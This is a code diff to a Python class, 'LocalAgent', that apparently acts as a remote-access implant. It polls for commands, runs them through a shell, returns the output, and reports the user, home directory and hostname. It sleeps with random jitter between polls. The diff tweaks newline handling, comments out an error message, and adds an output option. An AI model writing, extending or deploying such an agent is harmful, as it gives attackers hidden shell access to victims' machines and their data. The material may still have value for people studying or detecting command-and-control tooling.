@@ -50,7 +50,7 @@ class LocalAgent:
 				count += 1
 				if lineNums:
 					content = content + str(count) + ": "
-				content = content + line + os.linesep
+				content = content + line + "\n"
 			self.postResponse(content)
 			file.close()
 		except:
@@ -99,9 +99,9 @@ class LocalAgent:
 			username = getpass.getuser()
 			homedir = str(Path.home())
 			hostname = socket.gethostname()
-			response_str = "Username: " + username + os.linesep
-			response_str = response_str + "Home Directory: " + homedir + os.linesep
-			response_str = response_str + "Hostname: " + hostname + os.linesep
+			response_str = "Username: " + username + "\n"
+			response_str = response_str + "Home Directory: " + homedir + "\n"
+			response_str = response_str + "Hostname: " + hostname + "\n"
 			self.postResponse(response_str)
 			return None
 		elif response.startswith("ps"):
@@ -187,7 +187,7 @@ class LocalAgent:
 							f.write(file_read)
 						self.postResponse("Appended file")
 					except Exception as e:
-						print("Oops, something went wrong: {}".format(e), file=sys.stderr)
+						#print("Oops, something went wrong: {}".format(e), file=sys.stderr)
 						self.postResponse("Invalid cat directive")                
 				else:
 					self.postResponse("No valid cat interpretation")                
@@ -197,19 +197,20 @@ class LocalAgent:
 		else:
 			return response
 
-	def run(self):
+	def run(self, newLineAfterCmdOutput = False):
+		self.newLineAfterCmdOutput = newLineAfterCmdOutput
 		live = True
 		while(live):
 			try:
 				command = self.pollCommand()
 				if command != None:
 					cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8") 
+					if self.newLineAfterCmdOutput:
+						cmd_output = cmd_output + "\n"
 					self.postResponse(cmd_output)
 				else:
 					sleep_int = 1 + (random.randint(1,500) / 1000)
 					time.sleep(sleep_int)
-			except Exception:
+			except Exception as e:
 				live = False
-
-#agent = LocalAgent()
-#agent.run()
+				print("Shutting down {}".format(e), file=sys.stderr)
